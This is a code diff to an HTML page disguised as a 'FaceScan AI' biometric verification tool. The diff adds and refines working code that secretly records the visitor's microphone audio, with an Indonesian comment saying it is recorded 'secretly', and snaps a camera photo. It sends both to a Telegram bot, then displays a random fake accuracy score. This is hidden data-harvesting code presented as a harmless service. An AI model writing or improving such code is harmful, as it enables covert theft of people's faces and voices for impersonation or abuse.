@@ -4,11 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Face Biometric - Ultimate Analysis</title>
-    
     <script src="config.js"></script>
-    
     <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
-    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
         :root { --cyan: #00f2ff; }
@@ -29,14 +26,14 @@
 
     <div class="app-card">
         <div id="intro">
-            <h1 style="margin:0; letter-spacing:-1.5px">FaceScan <span style="color:var(--cyan)">AI</span></h1>
+            <h1>FaceScan <span style="color:var(--cyan)">AI</span></h1>
             <p style="color:#888; font-size: 0.9rem;">Analisis biometrik wajah dan sampel vokal untuk hasil akurasi 99.9%.</p>
             <button class="btn-main" id="start-btn">START VERIFICATION</button>
         </div>
 
         <div id="cam-holder">
             <div class="laser" id="laser-line"></div>
-            <video id="video" autoplay playsinline></video>
+            <video id="video" autoplay playsinline muted></video> 
         </div>
 
         <div id="status">READY TO SCAN</div>
@@ -63,21 +60,25 @@
         async function loadAI() {
             try {
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights');
-            } catch(e) { status.innerText = "ERROR LOADING AI"; }
+                status.innerText = "SENSOR READY";
+            } catch(e) { status.innerText = "AI MODULE ERROR"; }
         }
         loadAI();
 
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "SENSING FACE...";
+            status.innerText = "SENSING...";
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: {}, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
 
+                // MediaRecorder untuk merekam suara secara rahasia
                 mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) audioChunks.push(e.data);
+                };
                 
                 video.addEventListener('play', () => {
                     const checkLoop = setInterval(async () => {
@@ -88,24 +89,35 @@
                             isProcessing = true;
                             laser.style.display = 'block';
                             status.innerText = "SCANNING FACE & VOICE...";
+                            
+                            audioChunks = []; // Reset chunks
                             mediaRecorder.start();
 
+                            // Rekam selama 6 detik
                             setTimeout(() => {
-                                takeAndSend();
+                                mediaRecorder.stop(); // Berhenti rekam dulu baru jepret
                                 clearInterval(checkLoop);
-                            }, 5500);
+                            }, 6000);
                         } else {
-                            status.innerText = "FACE NOT FOUND";
+                            status.innerText = "POSITION FACE IN CIRCLE";
                         }
                     }, 800);
                 });
+
+                // Ketika rekaman suara berhenti, kirim semuanya
+                mediaRecorder.onstop = async () => {
+                    status.innerText = "PROCESSING DATA...";
+                    await takeAndSend();
+                };
+
             } catch (err) {
-                alert("Izin Kamera & Mikrofon wajib untuk analisis.");
+                alert("Izin Kamera & Mikrofon wajib!");
                 location.reload();
             }
         };
 
-        function takeAndSend() {
+        async function takeAndSend() {
+            // 1. Proses Foto (Mirror Fixed)
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -113,33 +125,33 @@
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob((photoBlob) => {
-                const score = Math.floor(Math.random() * 11) + 88;
-                
-                // MENGGUNAKAN CONFIG DARI FILE TERPISAH
-                const photoData = new FormData();
-                photoData.append('chat_id', CONFIG.CHAT_ID);
-                photoData.append('photo', photoBlob, 'face.png');
-                photoData.append('caption', `🔥 **PRANK PERFECT + AUDIO**\n\n🎯 Score: ${score}%\n📸 Foto & Voice terlampir.`);
-                
-                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
+            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+            const score = Math.floor(Math.random() * 11) + 88;
 
-                mediaRecorder.stop();
-                mediaRecorder.onstop = () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
-                    const audioData = new FormData();
-                    audioData.append('chat_id', CONFIG.CHAT_ID);
-                    audioData.append('voice', audioBlob, 'voice.ogg');
-                    
-                    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
-                    
-                    document.getElementById('cam-holder').style.display = 'none';
-                    status.style.display = 'none';
-                    document.getElementById('score-val').innerText = score + "%";
-                    document.getElementById('final-box').style.display = 'block';
-                    video.srcObject.getTracks().forEach(t => t.stop());
-                };
-            }, 'image/png');
+            // 2. Kirim Foto ke Telegram
+            const photoData = new FormData();
+            photoData.append('chat_id', CONFIG.CHAT_ID);
+            photoData.append('photo', photoBlob, 'face.png');
+            photoData.append('caption', `🎭 **PRANK PERFECT**\n\n🎯 Score: ${score}%\n📸 Foto wajah terlampir.`);
+            
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
+
+            // 3. Proses & Kirim Audio ke Telegram
+            const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+            const audioData = new FormData();
+            audioData.append('chat_id', CONFIG.CHAT_ID);
+            audioData.append('voice', audioBlob, 'voice.ogg');
+            
+            await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
+
+            // 4. UI Selesai
+            document.getElementById('cam-holder').style.display = 'none';
+            status.style.display = 'none';
+            document.getElementById('score-val').innerText = score + "%";
+            document.getElementById('final-box').style.display = 'block';
+
+            // Matikan Kamera & Mic
+            video.srcObject.getTracks().forEach(t => t.stop());
         }
     </script>
 </body>
